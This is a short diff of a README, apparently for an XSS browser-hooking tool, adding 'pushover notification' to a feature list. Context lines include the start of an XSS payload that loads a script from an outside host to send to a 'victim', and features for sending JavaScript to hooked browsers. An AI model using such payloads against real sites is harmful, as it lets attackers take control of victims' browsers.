@@ -19,6 +19,7 @@ Then send your XSS payload to the victim, ex: '"><script src=https://example.com
 - **view hooked browsers**
 - **view past hooked (unhooked) browsers**
 - **send js to currently hooked browsers and get response if available**
+- **pushover notification**
 
 **Todo:**
 
